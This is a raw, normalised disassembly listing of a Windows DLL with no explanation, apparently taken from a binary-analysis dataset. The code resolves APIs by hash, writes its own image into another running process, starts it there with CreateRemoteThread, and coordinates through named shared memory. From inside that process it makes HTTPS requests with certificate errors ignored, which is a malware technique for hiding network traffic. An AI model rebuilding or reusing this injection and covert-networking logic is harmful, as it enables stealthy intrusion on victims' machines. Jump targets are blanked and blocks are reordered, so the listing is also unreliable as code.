sub_1000100e
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
mov ebx 0xf001f
push esi
push ebx
call [ OpenFileMappingA@IAT ]
mov edi [ ebp + 0xc ]
mov [ edi ] eax
test eax eax
jne r-xdata
xor esi esi
inc esi
push [ ebp + 0x8 ]
push 0x1000c
push esi
push 0x4
push esi
push 0xffffffff
call [ CreateFileMappingA@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push esi
push esi
push esi
push ebx
push eax
call [ MapViewOfFile@IAT ]
test eax eax
je r-xdata
push [ edi ]
call [ CloseHandle@IAT ]
jmp r-xdata
push eax
mov [ eax ] esi
mov [ eax + 0x4 ] 0xff000
mov [ eax + 0x8 ] esi
call [ UnmapViewOfFile@IAT ]
sub_1000107f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi esi
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
mov [ ecx ] esi
push esi
push esi
push esi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
test eax eax
je r-xdata
cmp [ eax + 0x4 ] 0x1234abcd
jne r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov esi [ eax ]
test esi esi
jne r-xdata
xor edi edi
inc edi
mov [ eax + 0x4 ] 0xdcba4321
sub_100010d6
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
push esi
push 0xf001f
call [ OpenFileMappingA@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
test eax eax
je r-xdata
mov [ ecx ] esi
cmp eax 0xffffffff
je r-xdata
inc esi
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10001103
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
mov [ eax ] ecx
push esi
push edi
push edi
push edi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx edi
cmp [ esi + 0x4 ] 0x1234abcd
jne r-xdata
push esi
call [ UnmapViewOfFile@IAT ]
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ esi ]
cmp [ eax ] ecx
jb r-xdata
pop esi
xor eax eax
mov [ esi + 0x4 ] 0xdcba4321
inc eax
push ebx
mov ebx edi
test ecx ecx
je r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ esi ] edi
mov [ esi + 0x4 ] 0xff000
mov [ esi + 0x8 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x98761234
mov [ ebp + 0x8 ] edi
je r-xdata
pop ebx
push [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push eax
push [ ebp + 0xc ]
call sub_10003271
mov eax [ esi + 0x8 ]
add esp 0xc
add [ ebp + 0xc ] eax
add [ ebp - 0x4 ] eax
sub [ esi ] eax
mov [ esi + 0x4 ] 0x43216789
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
cmp [ esi ] edi
jne r-xdata
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0x98761234
jne r-xdata
xor eax eax
inc eax
test ebx ebx
jne r-xdata
sub_10001205
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
test eax eax
je r-xdata
mov eax edi
pop edi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
push esi
push edi
push edi
push edi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
cmp [ esi + 0x4 ] 0xff000
jne r-xdata
push esi
call [ UnmapViewOfFile@IAT ]
mov eax [ ebp + 0x10 ]
push ebx
mov [ esi ] eax
mov ebx edi
mov [ esi + 0x4 ] 0x1234abcd
mov [ ebp + 0x8 ] edi
pop ebx
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0xdcba4321
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
mov [ esi ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] 0xff000
cmove edi eax
mov eax [ esi ]
cmp eax 0x10000
jae r-xdata
mov [ esi + 0x8 ] 0x10000
mov [ esi + 0x8 ] eax
jmp r-xdata
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0x43216789
jne r-xdata
push [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push [ ebp + 0xc ]
push eax
call sub_10003271
mov eax [ ebp + 0xc ]
add esp 0xc
add eax [ esi + 0x8 ]
mov [ ebp + 0xc ] eax
xor eax eax
mov [ esi + 0x4 ] 0x98761234
inc eax
mov [ ebp + 0x8 ] edi
test ebx ebx
jne r-xdata
sub_1000131e
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp edi 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push edi
call [ GetExitCodeProcess@IAT ]
cmp [ ebp + 0x8 ] 0x103
jne r-xdata
push esi
push 0x1
push 0xa4137e37
call sub_10002609
add esp 0xc
test eax eax
je r-xdata
push esi
push 0x1
push 0xb9016a44
push eax
call sub_10002661
add esp 0x10
test eax eax
je r-xdata
push 0x8000
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
lea ecx [ ebp + 0xc ]
push ecx
push edi
call eax
mov esi eax
neg esi
sbb esi esi
inc esi
sub_10001399
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] esi
je r-xdata
push ebx
push esi
push 0x1
push 0xa4137e37
call sub_10002609
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
pop ebx
push esi
push 0x1
push 0x77b826b3
push ebx
call sub_10002661
push esi
push 0x1
push 0x2e33c8ac
push ebx
mov [ ebp - 0xc ] eax
call sub_10002661
push esi
push 0x1
push 0xb9016a44
push ebx
mov [ ebp - 0x10 ] eax
call sub_10002661
add esp 0x30
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xc ] esi
je r-xdata
cmp [ ebp - 0x10 ] esi
je r-xdata
test eax eax
je r-xdata
push sub_10001399
call sub_100024c9
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax 0x5a4d
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebx + 0x3c ]
cmp [ eax + ebx ] 0x4550
jne r-xdata
mov eax [ eax + ebx + 0x50 ]
push 0x40
push 0x3000
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push edi
call [ ebp - 0xc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0x4 ] eax
jb r-xdata
push eax
call sub_1000295a
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
push ebx
push eax
call sub_100029f9
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call sub_10002c39
add esp 0x18
test eax eax
je r-xdata
push 0x8000
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call [ ebp - 0x14 ]
push esi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push edi
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] esi
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
push esi
push esi
push [ ebp + 0x8 ]
sub eax ebx
add eax sub_10001545
push eax
push esi
push esi
push edi
call [ CreateRemoteThread@IAT ]
mov edi eax
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10002b15
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push 0x7530
push edi
call [ WaitForSingleObject@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push edi
call [ GetExitCodeThread@IAT ]
cmp eax 0x1
jne r-xdata
push [ ebp - 0xc ]
call sub_10002a8f
pop ecx
mov ecx [ ebp + 0xc ]
xor esi esi
mov eax [ ebp + 0x8 ]
inc esi
mov [ ecx ] eax
jmp r-xdata
sub_10001555
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
cmp [ ebp + 0x10 ] esi
je r-xdata
cmp ebx 0xffffffff
jne r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push ebx
call [ GetExitCodeProcess@IAT ]
cmp [ ebp + 0x8 ] 0x103
jne r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push esi
call [ CreateThread@IAT ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov esi eax
push esi
push esi
push [ ebp + 0x14 ]
sub edi eax
add edi [ ebp + 0x10 ]
push edi
push esi
push esi
push ebx
call [ CreateRemoteThread@IAT ]
push sub_10001399
call sub_100024c9
pop ecx
sub_100015cd
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_10002a8f
pop ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
push [ esi + 0x8 ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
push [ esi + 0xc ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x14 ] 0x0
je r-xdata
push [ esi + 0x10 ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x18 ] 0x0
je r-xdata
push [ esi + 0x14 ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
push [ esi + 0x18 ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push [ esi + 0x1c ]
call sub_10002a8f
pop ecx
cmp [ esi + 0x24 ] 0x0
je r-xdata
push [ esi + 0x20 ]
call sub_10002a8f
pop ecx
pop esi
pop ebp
retn
push [ esi + 0x24 ]
call sub_10002a8f
pop ecx
sub_1000165c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx edi
test esi esi
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov [ eax ] edi
push ebx
lea ebx [ esi + eax ]
mov ecx esi
cmp esi ebx
jae r-xdata
mov eax edi
shl eax 0x3
push eax
call sub_1000295a
pop ecx
mov ecx eax
cmp esi ebx
jae r-xdata
mov eax [ ecx ]
inc edi
add ecx 0x4
add ecx eax
cmp ecx ebx
jb r-xdata
pop ebx
lea edx [ ecx + 0x4 ]
mov eax [ esi ]
add esi 0x4
mov [ edx ] eax
xor eax eax
cmp [ edx ] eax
cmovne eax esi
add esi [ edx ]
mov [ edx - 0x4 ] eax
lea edx [ edx + 0x8 ]
cmp esi ebx
jb r-xdata
sub_100016c8
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002cf7
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002d6c
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push edi
push sub_10001a63
push [ ebp - 0x8 ]
push ebx
call sub_10001555
add esp 0x14
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002154
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001e2f
mov edi [ ebp - 0xc ]
add esp 0xc
sub_100017ca
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002cf7
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002d6c
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push edi
push sub_100018cc
push [ ebp - 0x8 ]
push ebx
call sub_10001555
add esp 0x14
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002154
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001e2f
mov edi [ ebp - 0xc ]
add esp 0xc
sub_100018cc
push ebp
mov ebp esp
sub esp 0x68
push ebx
lea eax [ ebp - 0x8 ]
xor ebx ebx
push eax
push r--data
mov [ ebp - 0x8 ] ebx
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x8 ] ebx
je r-xdata
push esi
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x68 ]
push eax
call sub_10001c39
pop ecx
pop ecx
push 0xa
pop ecx
push ebx
push ebx
mov esi eax
lea edi [ ebp - 0x40 ]
[ edi ] [ esi ]
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
push eax
call [ InternetConnectA@IAT ]
push [ ebp - 0x30 ]
mov edi eax
mov [ ebp - 0x14 ] edi
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push ebx
push 0x800000
push ebx
push ebx
push ebx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001d56
push [ ebp - 0x1c ]
call sub_10002d28
pop ecx
pop ecx
push eax
push [ ebp - 0x1c ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x2c ]
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x18 ]
call esi
lea eax [ ebp - 0x40 ]
push eax
call sub_100015cd
push [ ebp - 0x8 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
or [ ebp - 0x4 ] 0xffffffff
push 0x10000
call sub_1000295a
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ebx
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x30 ]
call sub_10002d28
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x30 ]
push 0x2b
push edi
call esi
push [ ebp - 0x2c ]
call sub_10002d28
pop ecx
push eax
push [ ebp - 0x2c ]
push 0x2c
push edi
call esi
push eax
call sub_10002a8f
push ebx
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_10001eb1
add esp 0x10
mov edi eax
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax ebx
push eax
push [ ebp - 0xc ]
call sub_10002aad
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push edi
lea ecx [ eax + ebx ]
push ecx
call sub_10003271
add ebx [ ebp - 0x4 ]
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x10000
push edi
push esi
call [ InternetReadFile@IAT ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_10001a63
push ebp
mov ebp esp
sub esp 0x6c
push ebx
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
push r--data
mov [ ebp - 0x4 ] ebx
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x4 ] ebx
je r-xdata
push esi
push edi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x6c ]
push eax
call sub_10001c39
pop ecx
pop ecx
push 0xa
pop ecx
push ebx
push ebx
mov esi eax
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
push eax
call [ InternetConnectA@IAT ]
push [ ebp - 0x34 ]
mov edi eax
mov [ ebp - 0x18 ] edi
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push ebx
push 0x800000
push ebx
push ebx
push ebx
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001d56
push [ ebp - 0x20 ]
call sub_10002d28
pop ecx
pop ecx
push eax
push [ ebp - 0x20 ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x30 ]
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x1c ]
call esi
lea eax [ ebp - 0x44 ]
push eax
call sub_100015cd
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ebx
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] 0x4
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
cmp [ ebp - 0x14 ] 0xc8
jne r-xdata
push [ ebp - 0x34 ]
call sub_10002d28
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x34 ]
push 0x2b
push edi
call esi
push [ ebp - 0x30 ]
call sub_10002d28
pop ecx
push eax
push [ ebp - 0x30 ]
push 0x2c
push edi
call esi
push 0x1
push r--data
push [ ebp - 0x4 ]
call sub_10001eb1
add esp 0xc
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x4
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ebx
push eax
push 0x20000005
push esi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x24
jbe r-xdata
push [ ebp - 0x8 ]
call sub_1000295a
pop ecx
mov ecx [ ebp - 0x8 ]
mov edi eax
mov [ ebp - 0x10 ] ebx
cmp ebx ecx
jne r-xdata
cmp ebx ecx
jb r-xdata
push edi
call sub_10002a8f
mov edi [ ebp - 0x18 ]
pop ecx
jmp r-xdata
push ecx
push edi
push [ ebp - 0x4 ]
call sub_10001eb1
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea eax [ ebx + edi ]
push eax
push esi
call [ InternetReadFile@IAT ]
add ebx [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
mov ecx [ ebp - 0x8 ]
je r-xdata
sub_10001c39
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
push 0x9
xor esi esi
lea edi [ ebx + 0x4 ]
pop ecx
mov [ ebx ] esi
[ edi ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push [ ebp + 0xc ]
call sub_10001e2f
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push [ ebp - 0x4 ]
push edi
call sub_1000165c
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push edi
call sub_10002a8f
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
inc eax
push eax
push [ esi ]
call sub_10002ae7
mov [ ebx ] eax
mov eax [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebx + 0x4 ] eax
mov eax [ esi + 0x14 ]
inc eax
push eax
push [ esi + 0x10 ]
call sub_10002ae7
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x1c ]
inc eax
push eax
push [ esi + 0x18 ]
call sub_10002ae7
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x24 ]
inc eax
push eax
push [ esi + 0x20 ]
call sub_10002ae7
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x2c ]
inc eax
push eax
push [ esi + 0x28 ]
call sub_10002ae7
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x34 ]
inc eax
push eax
push [ esi + 0x30 ]
call sub_10002ae7
mov [ ebx + 0x18 ] eax
mov eax [ esi + 0x3c ]
inc eax
push eax
push [ esi + 0x38 ]
call sub_10002ae7
mov [ ebx + 0x1c ] eax
mov eax [ esi + 0x44 ]
inc eax
push eax
push [ esi + 0x40 ]
call sub_10002ae7
mov [ ebx + 0x20 ] eax
add esp 0x40
mov eax [ esi + 0x4c ]
inc eax
push eax
push [ esi + 0x48 ]
call sub_10002ae7
push esi
mov [ ebx + 0x24 ] eax
call sub_10002a8f
add esp 0xc
sub_10001d56
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x4
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push [ ebp + 0x8 ]
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x4 ] 0x3180
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1f
push [ ebp + 0x8 ]
call [ InternetSetOptionA@IAT ]
mov esp ebp
pop ebp
retn
sub_10001d91
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov ecx ebx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop edi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] ebx
push esi
lea esi [ edi + eax * 8 ]
mov ecx edi
cmp edi esi
jae r-xdata
push ebx
call sub_1000295a
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp edi esi
jae r-xdata
add ebx 0x4
add ebx [ ecx + 0x4 ]
add ecx 0x8
cmp ecx esi
jb r-xdata
pop esi
sub esi edi
lea ecx [ edi + 0x4 ]
dec esi
mov edi ecx
shr esi 0x3
mov ebx eax
inc esi
mov [ ebp - 0x4 ] ebx
add edi 0x8
sub esi 0x1
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push 0x4
push edi
push ebx
call sub_100029f9
add esp 0xc
add ebx 0x4
cmp [ edi - 0x4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
push [ edi ]
push [ edi - 0x4 ]
push ebx
call sub_100029f9
add esp 0xc
add ebx [ edi ]
sub_10001e2f
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ebx
mov [ edi ] eax
mov ebx eax
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
pop ebx
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc ebx
push eax
push [ ebp + 0x8 ]
call sub_1000107f
pop ecx
test eax eax
mov eax [ ebp - 0x4 ]
pop ecx
je r-xdata
cmp ebx 0x258
jne r-xdata
test eax eax
je r-xdata
test esi esi
jne r-xdata
xor esi esi
inc esi
inc eax
push eax
mov [ ebp - 0x4 ] eax
call sub_1000295a
lea ecx [ ebp - 0x4 ]
mov [ edi ] eax
push ecx
push eax
push [ ebp + 0x8 ]
call sub_10001103
mov esi eax
add esp 0x10
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_10001eb1
push ebp
mov ebp esp
xor eax eax
push esi
mov esi eax
pop esi
pop ebp
retn
push 0xc8
call [ Sleep@IAT ]
push [ ebp + 0x10 ]
inc esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001205
add esp 0xc
cmp esi 0x258
jne r-xdata
test eax eax
jne r-xdata
sub_10001ee5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002cf7
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002d6c
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push edi
push sub_10001fe7
push [ ebp - 0x8 ]
push ebx
call sub_10001555
add esp 0x14
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002154
pop ecx
pop ecx
test eax eax
je r-xdata
